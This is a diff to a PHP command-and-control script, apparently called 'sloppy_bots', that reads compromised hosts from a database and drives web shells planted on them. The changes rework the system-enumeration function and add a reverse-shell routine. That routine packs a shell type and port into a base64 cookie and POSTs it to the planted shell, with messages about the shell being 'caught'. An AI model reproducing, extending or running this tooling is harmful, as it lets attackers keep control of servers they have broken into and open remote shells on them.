@@ -147,7 +147,7 @@ function opts()
 
 function sys($host)
 {
-    if (!empty($host) && !empty($userA)) {
+    if (!empty($host)) {
         $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
         $axX = pg_fetch_row($tc);
         curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1]."?qs=cqBS");
@@ -158,7 +158,9 @@ function sys($host)
         if (!curl_errno(CHH)) {
             switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                 case 200:
-                    return $syst;
+                    logo('enumerate system', clears, false, '', $axX[0]);
+                    echo $syst;
+                    break;
                 default:
                     throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
             }
@@ -170,27 +172,49 @@ function sys($host)
     return 0;
 }
 
-function rev($host, $shell, $port, $os)
+function rev($host, $port, $method)
 {
     $usePort = null;
     $Ushell = null;
-    if (isset($host) and isset($port)) {
-        if ($port === "default" && $shell === "default" && $os === "win") {
+    if (isset($host)) {
+        $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri,os_flavor FROM sloppy_bots_main WHERE id = '%s'", $host));
+        $axX = pg_fetch_row($tc);
+        if (empty($port)){
             $usePort = "1634";
-            $Ushell = "cmd";
-        } elseif ($os === "lin") {
-            $usePort = "1634";
-            $Ushell = "bash";
-        } else {
-            $Ushell = $shell;
+        }else{
             $usePort = $port;
         }
-        if (!is_null($Ushell)) {
-            echo "[ !! ] Setting custom options: \n";
-            echo "Shell: " . $Ushell . "\n";
-            echo "OS: " . $os . "\n";
+        if (empty($method)){
+            $useMethod = "bash";
+        }else{
+            $useMethod = $method;
+        }
+        if (empty($useShell) && $axX[2] == "lin"){
+            $useShell = "bash";
+        }else{
+            $useShell = "cmd";
         }
         echo "[ ++ ] Trying: " . $host . " on " . $usePort . "[ ++ ]\n";
+        $revCommand = base64_encode($useMethod.".".$usePort.".".$useShell);
+        curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1]);
+        curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
+        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
+        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt(CHH, CURLOPT_POST, true);
+        curl_setopt(CHH, CURLOPT_COOKIE, "r={$revCommand}");
+        curl_setopt(CHH, CURLOPT_POSTFIELDS, "");
+        $syst = curl_exec(CHH);
+        if (!curl_errno(CHH)) {
+            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
+                case 200:
+                    logo('co', clears, false, '', $axX[0]);
+                    echo $syst;
+                    break;
+                default:
+                    logo('co', clears, true, "Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n", $axX[0]);
+            }
+
+        }
     } else {
         logo('reverse', clears, true, '', $host);
     }
@@ -544,7 +568,7 @@ while ($run) {
             awesomeMenu();
             $h = readline("Which host are we checking?\n->");
             try {
-                sys($h, queryDB($h, "s"));
+                sys($h);
             } catch (Exception $e) {
                 logo("s", clears, true, $e, $h);
             }
@@ -554,14 +578,9 @@ while ($run) {
             awesomeMenu();
             $h = readline("Please tell me the host.\n->");
             $p = readline("\nWhich port shall we use?\n->");
-            try {
-                $o = !empty(queryDB($h, 'r')) ? "win" : "lin";
-            } catch (Exception $e) {
-                logo("r", clears, true, $e, '');
-            }
-            echo $o;
-            if (!empty($h) && !empty($p)) {
-                rev($host = $h, "default", $port = $p, $o);
+            $m = readline("Which method is to be used?(default is bash)\n->");
+            if (!empty($h)) {
+                rev($h, $p, $m);
             }
             break;
         case "c":
